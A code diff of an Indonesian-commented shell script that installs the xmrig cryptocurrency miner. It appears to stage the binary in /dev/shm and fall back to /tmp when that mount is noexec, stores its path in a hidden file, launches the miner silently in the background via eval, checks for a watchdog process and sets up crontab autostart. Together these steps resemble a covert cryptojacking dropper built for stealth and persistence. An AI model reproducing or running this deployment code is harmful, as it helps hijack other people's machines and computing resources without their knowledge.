@@ -22,22 +22,22 @@ else
     exit 1
 fi
 
-# ===== Cek Eksekusi xmrig =====
-if ! ./xmrig --help > /dev/null 2>&1; then
-    echo "[!] xmrig tidak dapat dijalankan, kemungkinan /dev/shm noexec"
+# ===== Deteksi noexec dan simpan path eksekusi =====
+BIN_PATH="$MINER_SUBDIR/xmrig"
+if ! "$BIN_PATH" --help > /dev/null 2>&1; then
+    echo "[!] xmrig tidak bisa dijalankan di $MINER_SUBDIR, kemungkinan /dev/shm noexec"
     TMP_BIN="/tmp/xmrig"
-    cp xmrig "$TMP_BIN"
+    cp "$BIN_PATH" "$TMP_BIN"
     chmod +x "$TMP_BIN"
     if "$TMP_BIN" --help > /dev/null 2>&1; then
         echo "[*] xmrig dapat dijalankan dari /tmp"
-        echo "$TMP_BIN" > "$MINER_SUBDIR/.binpath"
+        BIN_PATH="$TMP_BIN"
     else
-        echo "[!] Gagal menjalankan xmrig di /tmp juga"
+        echo "[!] Gagal: xmrig tidak bisa dijalankan dari /tmp juga"
         exit 1
     fi
-else
-    echo "$MINER_SUBDIR/xmrig" > "$MINER_SUBDIR/.binpath"
 fi
+echo "$BIN_PATH" > "$MINER_SUBDIR/.binpath"
 
 # ===== Buat konfigurasi =====
 cat > config_background.json <<EOF
@@ -94,7 +94,7 @@ else
     eval "$CMD > /dev/null 2>&1 &"
 fi
 
-# ===== Verifikasi =====
+# ===== Verifikasi Watchdog =====
 sleep 2
 if pgrep -f "watchdog.sh" > /dev/null; then
     echo "[✓] Watchdog aktif di background."
@@ -110,4 +110,4 @@ else
     echo "[!] crontab tidak ditemukan. Lewati autostart."
 fi
 
-echo "[✓] Selesai. xmrig disimpan di: $(cat "$MINER_SUBDIR/.binpath")"
+echo "[✓] Selesai. xmrig disimpan di: $BIN_PATH"
